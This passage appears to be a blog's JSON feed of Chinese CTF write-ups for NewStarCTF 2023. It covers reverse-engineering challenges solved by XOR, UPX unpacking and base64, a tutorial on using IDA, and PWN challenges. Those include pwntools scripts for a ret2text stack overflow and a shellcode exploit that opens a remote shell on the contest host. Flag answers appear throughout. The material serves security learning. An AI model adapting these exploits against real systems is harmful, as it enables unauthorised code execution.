punctuation\">,</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token number\">76</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token number\">37</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token number\">96</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token number\">88</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token number\">116</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token number\">113</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token number\">112</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token number\">36</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token number\">97</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token number\">65</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token number\">125</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token number\">103</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token number\">37</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token number\">96</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token number\">114</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token number\">125</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token number\">65</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token number\">39</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token number\">112</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token number\">70</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token number\">112</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token number\">118</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token number\">37</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token number\">123</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token number\">113</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token number\">69</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token number\">79</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token number\">82</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token number\">84</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token number\">89</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token number\">84</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token number\">77</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token number\">76</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token number\">36</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token number\">112</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token number\">99</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token number\">112</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    <span class=\"token number\">36</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token number\">65</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token number\">39</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    <span class=\"token number\">116</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    <span class=\"token number\">97</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    <span class=\"token number\">36</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    <span class=\"token number\">102</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    <span class=\"token number\">86</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    <span class=\"token number\">37</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>    <span class=\"token number\">37</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    <span class=\"token number\">36</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    <span class=\"token number\">104</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>data <span class=\"token operator\">=</span> hello<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>    data<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> data<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">21</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token builtin\">bytearray</span><span class=\"token punctuation\">(</span>enc<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> data<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'WOW!!'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'I believe you can do it!'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'To be continue...'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>可以发现，flag 就是将每个字符和 21 进行了异或操作，我们只需要每个字符再和 21 进行一次异或操作就可以获得 flag 的 ASCII 值，再转换为 ASCII 码即可得到正确的 flag。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>enc <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token number\">115</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token number\">121</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token number\">116</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token number\">114</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token number\">110</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token number\">76</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token number\">37</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token number\">96</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token number\">88</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token number\">116</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token number\">113</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token number\">112</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token number\">36</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token number\">97</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token number\">65</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token number\">125</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token number\">103</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token number\">37</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token number\">96</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token number\">114</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token number\">125</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token number\">65</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token number\">39</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token number\">112</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token number\">70</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token number\">112</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token number\">118</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token number\">37</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token number\">123</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token number\">113</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token number\">69</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token number\">79</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token number\">82</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token number\">84</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token number\">89</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token number\">84</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token number\">77</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token number\">76</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token number\">36</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token number\">112</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token number\">99</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token number\">112</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token number\">36</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token number\">65</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token number\">39</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token number\">116</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token number\">97</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token number\">36</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token number\">102</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token number\">86</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token number\">37</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    <span class=\"token number\">37</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token number\">36</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token number\">104</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>enc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    enc<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> enc<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">21</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>ascii_string <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> num <span class=\"token keyword\">in</span> enc<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>ascii_string<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><code>flag&#123;Y0uMade1tThr0ughT2eSec0ndPZGALAXY1eve1T2at1sC001&#125;</code></p>\n",
            "tags": [
                "BUUCTF"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/10/08/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20RE/",
            "url": "http://yanagi-kon.github.io/2023/10/08/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20RE/",
            "title": "NewStarCTF 2023 公开赛道 RE题目",
            "date_published": "2023-10-08T06:31:00.000Z",
            "content_html": "<h2 id=\"newstarctf-2023-公开赛道-re\"><a class=\"markdownIt-Anchor\" href=\"#newstarctf-2023-公开赛道-re\">#</a> NewStarCTF 2023 公开赛道 RE</h2>\n<h3 id=\"easy_re\"><a class=\"markdownIt-Anchor\" href=\"#easy_re\">#</a> easy_RE</h3>\n<p><strong>考点：shift+F12</strong></p>\n<p>打开 IDA 就可以看到一半的 flag：</p>\n<p>![image-20231008143237939](NewStarCTF 2023 公开赛道 RE/image-20231008143237939.png)</p>\n<p>另一半 flag 使用  <code>shift F12</code>  查看字符串，可以查找到</p>\n<p>![image-20231008143316980](NewStarCTF 2023 公开赛道 RE/image-20231008143316980.png)</p>\n<p>flag： <code>flag&#123;we1c0me_to_rev3rse!!&#125;</code></p>\n<h3 id=\"壳\"><a class=\"markdownIt-Anchor\" href=\"#壳\">#</a> 壳</h3>\n<p><strong>考点</strong>：<strong>UPX 壳</strong></p>\n<p>使用 DIE 工具进行查壳：</p>\n<p>![image-20231008144157636](NewStarCTF 2023 公开赛道 RE/image-20231008144157636.png)</p>\n<p>发现是 UPX4.02，那么只需要用高版本 UPX 工具，即可脱壳。使用<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3VweC91cHgvcmVsZWFzZXM=\"> UPX 脱壳工具</span>进行脱壳，</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>upx <span class=\"token parameter variable\">-d</span> E:<span class=\"token punctuation\">\\</span>ramDownLoad<span class=\"token punctuation\">\\</span>KE.exe</pre></td></tr></table></figure><p>![image-20231008150024506](NewStarCTF 2023 公开赛道 RE/image-20231008150024506.png)</p>\n<p>脱壳后再使用 IDA 打开程序，查看 main 函数，可以发现，程序将 flag 的每个字符 + 1，然后喝 enc 进行比较：</p>\n<p>![image-20231008150903238](NewStarCTF 2023 公开赛道 RE/image-20231008150903238.png)</p>\n<p>于是我们双击 enc，获取到 enc 的值，再将 enc 的每个字符 - 1，就可以得到 flag：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>enc <span class=\"token operator\">=</span> <span class=\"token string\">b'gmbh|D1ohsbuv2bu21ot1oQb332ohUifG2stuQ[HBMBYZ2fwf2~'</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>i<span class=\"token operator\">-</span><span class=\"token number\">1</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> enc<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>![image-20231008151250083](NewStarCTF 2023 公开赛道 RE/image-20231008151250083.png)</p>\n<p><code>flag&#123;C0ngratu1at10ns0nPa221ngTheF1rstPZGALAXY1eve1&#125;</code></p>\n<h3 id=\"segments\"><a class=\"markdownIt-Anchor\" href=\"#segments\">#</a> Segments</h3>\n<p><strong>考点：</strong> <code>shift+F7</code></p>\n<p>IDA 打开题目，提示我们 使用  <code>shift+F7</code> ：</p>\n<p>![image-20231008191757619](NewStarCTF 2023 公开赛道 RE/image-20231008191757619.png)</p>\n<p>打开 segment 窗口：</p>\n<p>![image-20231008192402656](NewStarCTF 2023 公开赛道 RE/image-20231008192402656.png)</p>\n<p>可以发现，flag 被拆分为了许多段。</p>\n<p you_ar3_g00d_at_f1nding_elf_segments_name>flag 为 ： flag</p>\n<h3 id=\"elf\"><a class=\"markdownIt-Anchor\" href=\"#elf\">#</a> ELF</h3>\n<p><strong>考点：了解 ELF 文件，基本异或操作</strong></p>\n<p>打开 IDA，进入主函数，可以发现 flag 先进行了一次 encode 操作，对每一个字符都和 32 进行了与操作，并＋16：</p>\n<p>![image-20231008194607787](NewStarCTF 2023 公开赛道 RE/image-20231008194607787.png)</p>\n<p>随后进行 base64 加密，base64 的密码本是正常的，可以放心解密：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> base64 <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>s <span class=\"token operator\">=</span> <span class=\"token string\">b'VlxRV2t0II8kX2WPJ15fZ49nWFEnj3V8do8hYy9t'</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>s1 <span class=\"token operator\">=</span> b64decode<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token string\">b''</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> s1<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    flag <span class=\"token operator\">+=</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">-</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>得出 flag： <code>flag&#123;D0_4ou_7now_wha7_ELF_1s?&#125;</code></p>\n<p>![image-20231008201358737](NewStarCTF 2023 公开赛道 RE/image-20231008201358737.png)</p>\n",
            "tags": [
                "BUUCTF"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/10/05/IDA%20%E4%BD%BF%E7%94%A8/",
            "url": "http://yanagi-kon.github.io/2023/10/05/IDA%20%E4%BD%BF%E7%94%A8/",
            "title": "IDA 使用",
            "date_published": "2023-10-05T09:06:00.000Z",
            "content_html": "<h2 id=\"ida-使用\"><a class=\"markdownIt-Anchor\" href=\"#ida-使用\">#</a> IDA 使用</h2>\n<p>建议去看<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMWVtNHkxUDdQTS8/c2hhcmVfc291cmNlPWNvcHlfd2ViJmFtcDt2ZF9zb3VyY2U9N2Q5NDgxMDFhMGVkNDczNzcyZTU4ZWVhMzdjNjFmOTQ=\">视频</span>，讲的很详细，很好。</p>\n<p>一般先找程序入口点，在  <code>Exports</code>  里面：</p>\n<p>![image-20231005103252765](IDA 使用 /image-20231005103252765.png)</p>\n<p>双击该内容  <code>start</code>  就可以直接定位到程序中的位置：</p>\n<p>![image-20231005103353127](IDA 使用 /image-20231005103353127.png)</p>\n<p>一般的，我们可以在  <code>option -&gt; general</code>  中将  <code>Stack Pointer</code>  和  <code>Auto comments</code>  打开，可以方便我们更好的查看源码的对应：</p>\n<p>![image-20231005103646708](IDA 使用 /image-20231005103646708.png)</p>\n<p>空格键可以切换视图效果：</p>\n<p>![image-20231005103807473](IDA 使用 /image-20231005103807473.png)</p>\n<p>切换过来后可以看到前面的地址以及段名称，如 <code>.text:00000000004010B0</code></p>\n<p>对着你想要反编译的内容 按  <code>F5</code> ，进行反编译：</p>\n<p>![image-20231005104011702](IDA 使用 /image-20231005104011702.png)</p>\n<p>可以在上面的页面中双击 main 进入到 main 函数中。</p>\n<p>右键  <code>Collapse declaration</code>  可以折叠变量，方便查看源码。</p>\n<p><code>N</code>  键可以用于重命名函数的变量名</p>\n<p><code>R</code>  键可以转换为字符模式显示</p>\n<p><code>H</code>  以数字或 16 进制显示</p>\n",
            "tags": [
                "知识"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/10/05/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20PWN/",
            "url": "http://yanagi-kon.github.io/2023/10/05/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20PWN/",
            "title": "NewStarCTF 2023 公开赛道 PWN",
            "date_published": "2023-10-05T09:06:00.000Z",
            "content_html": "<h2 id=\"newstarctf-2023-公开赛道-pwn\"><a class=\"markdownIt-Anchor\" href=\"#newstarctf-2023-公开赛道-pwn\">#</a> NewStarCTF 2023 公开赛道 PWN</h2>\n<h3 id=\"ret2text\"><a class=\"markdownIt-Anchor\" href=\"#ret2text\">#</a> ret2text</h3>\n<p><strong>考点：栈溢出，ret2txt</strong></p>\n<p>IDA 打开程序，找到主函数如下：</p>\n<p>![image-20231005150446089](NewStarCTF 2023 公开赛道 PWN/image-20231005150446089.png)</p>\n<p>发现是栈溢出类型的题目，在函数中也可以找到后门函数：</p>\n<p>![image-20231005150527611](NewStarCTF 2023 公开赛道 PWN/image-20231005150527611.png)</p>\n<p>利用 python 编写，直接填充字符覆盖返回地址为后门函数的地址即可</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>sh <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">25575</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>sh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b\"magic\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>backdoor <span class=\"token operator\">=</span> <span class=\"token number\">0x4011FB</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x20</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>backdoor<span class=\"token punctuation\">)</span>  <span class=\"token comment\">#p64 (0) 是为了覆盖掉 ebp</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>sh<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>sh<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>![image-20231005131606898](NewStarCTF 2023 公开赛道 PWN/image-20231005131606898.png)</p>\n<h3 id=\"ezshellcode\"><a class=\"markdownIt-Anchor\" href=\"#ezshellcode\">#</a> ezshellcode</h3>\n<p><strong>考点：shellcode</strong></p>\n<p>打开题目，在 IDA 中进行查看 main 函数：</p>\n<p>![image-20231007155118707](NewStarCTF 2023 公开赛道 PWN/image-20231007155118707.png)</p>\n<p>buf 被分配了 1000 字节的空间，起始地址为  <code>0x66660000</code></p>\n<p>最后一行  <code>JUMPOUT</code>  直接跳转到  <code>0x66660000</code>  地址并开始运行。题目会执行我们发送的字符，直接用 pwntools 库生成 shellcode 发送即可</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>sh <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">27833</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os <span class=\"token operator\">=</span> <span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>arch <span class=\"token operator\">=</span> <span class=\"token string\">'amd64'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>payload <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>sh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b\"magic\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>sh<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>sh<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>![image-20231007155312386](NewStarCTF 2023 公开赛道 PWN/image-20231007155312386.png)</p>\n<p>得到 flag： 